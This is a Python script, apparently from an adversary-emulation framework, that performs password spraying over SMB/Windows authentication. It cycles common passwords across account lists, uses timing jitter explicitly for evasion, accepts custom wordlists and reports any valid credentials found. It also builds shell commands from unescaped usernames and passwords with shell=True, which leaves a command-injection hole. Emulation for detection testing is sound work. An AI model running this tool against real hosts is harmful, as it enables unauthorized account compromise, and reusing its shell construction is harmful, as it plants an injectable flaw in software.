#!/usr/bin/env python3
"""
Adversary Emulation: RDP / Network Password Spraying & Brute Force
Framework: MITRE ATT&CK T1110.003 (Password Spraying) & T1110.001 (Password Guessing)
Author: Nayan Solanki
Purpose: Simulates authentication attacks to generate Event ID 4625 telemetry with advanced evasion.
"""

import argparse
import platform
import subprocess
import time
import os
import random
from engine import BaseAdversaryTechnique

DEFAULT_PASSWORDS = [
    "Password123",
    "Admin2026!",
    "Welcome1!",
    "Summer2026",
    "123456",
    "Spring2026!",
    "Company2026",
    "Winter2025!"
]

DEFAULT_USERS = [
    "Administrator",
    "Guest",
    "jsmith",
    "admin",
    "service_account"
]


class BruteForceSimulator(BaseAdversaryTechnique):
    def __init__(self, users=None, delay=2.0, jitter=0.5, wordlist=None, userlist=None):
        super().__init__(
            technique_id="T1110.003",
            technique_name="Password Spraying",
            tactic="Credential Access"
        )
        self.delay = delay
        self.jitter = jitter
        self.wordlist = wordlist
        self.userlist = userlist

        self.passwords = DEFAULT_PASSWORDS
        self.users = users if users else DEFAULT_USERS

        if self.wordlist and os.path.exists(self.wordlist):
            try:
                with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
                    self.passwords = [line.strip() for line in f if line.strip()]
            except Exception as e:
                self.logger.error(f"Failed to load wordlist: {e}")

        if self.userlist and os.path.exists(self.userlist):
            try:
                with open(self.userlist, "r", encoding="utf-8", errors="ignore") as f:
                    self.users = [line.strip() for line in f if line.strip()]
            except Exception as e:
                self.logger.error(f"Failed to load userlist: {e}")

    def _simulate_windows_auth(self, target_ip: str, username: str, password: str) -> bool:
        os_type = platform.system().lower()
        if os_type == "windows":
            # 2>&1 redirects stderr to stdout for proper capture
            cmd = f"net use \\\\{target_ip} /user:{username} {password} 2>&1"
        else:
            # -t 2 sets timeout to 2 seconds for smbclient
            cmd = f"smbclient -L //{target_ip} -U '{username}%{password}' -t 2"

        try:
            # Timeout set to 5s to prevent hanging on unresponsive hosts
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            # Cleanup IPC connection if successful
            if os_type == "windows" and result.returncode == 0:
                subprocess.run(f"net use \\\\{target_ip} /delete /y", shell=True, capture_output=True)
            return result.returncode == 0
        except subprocess.TimeoutExpired:
            self.logger.warning(f"Connection timeout attempting auth to {target_ip}")
            return False
        except Exception as e:
            self.logger.error(f"Execution error: {e}")
            return False

    def execute(self, target_ip=None, dry_run=False):
        if not target_ip:
            target_ip = "192.168.56.10"

        self.logger.info(f"Target Host : {target_ip}")
        self.logger.info(f"Target Users: {len(self.users)} accounts")
        self.logger.info(f"Payload Pool: {len(self.passwords)} credentials")
        self.logger.info(f"Evasion: {self.delay}s delay with {self.jitter}s jitter")
        
        attempts = 0
        success_creds = []

        # Proper Password Spraying (T1110.003): Iterate users first for each password to avoid lockouts
        for pwd in self.passwords:
            for usr in self.users:
                attempts += 1
                self.logger.info(f"[{attempts}] Spraying user '{usr}' with '{pwd}'")

                if dry_run:
                    self.logger.info("    [DRY RUN] Skipping actual auth attempt.")
                    continue

                success = self._simulate_windows_auth(target_ip, usr, pwd)
                if success:
                    self.logger.warning(f"[+] SUCCESS! Valid credential discovered: {usr}:{pwd}")
                    success_creds.append(f"{usr}:{pwd}")
                else:
                    self.logger.info("[-] Authentication failed as anticipated (Generating Event 4625).")

                # Apply delay with jitter for evasion
                current_jitter = random.uniform(-self.jitter, self.jitter)
                sleep_time = max(0, self.delay + current_jitter)
                time.sleep(sleep_time)

        return {
            "target": target_ip,
            "attempts": attempts,
            "success": len(success_creds) > 0,
            "credentials": success_creds
        }

    def cleanup(self):
        return True


def main():
    parser = argparse.ArgumentParser(description="Simulate Password Spraying (T1110.003)")
    parser.add_argument("--target", "-t", default="192.168.56.10", help="Target IP address")
    parser.add_argument("--user", "-u", help="Single user to target (overrides default user list)")
    parser.add_argument("--userlist", "-U", help="Path to file containing list of usernames")
    parser.add_argument("--delay", "-d", type=float, default=2.0, help="Base delay between attempts in seconds")
    parser.add_argument("--jitter", "-j", type=float, default=0.5, help="Randomized jitter added/subtracted to delay")
    parser.add_argument("--wordlist", "-w", help="Path to file containing list of passwords")
    parser.add_argument("--dry-run", action="store_true", help="Log actions without executing them")
    args = parser.parse_args()

    users = [args.user] if args.user else None
    simulator = BruteForceSimulator(
        users=users,
        delay=args.delay,
        jitter=args.jitter,
        wordlist=args.wordlist,
        userlist=args.userlist
    )
    simulator.execute(target_ip=args.target, dry_run=args.dry_run)


if __name__ == "__main__":
    main()
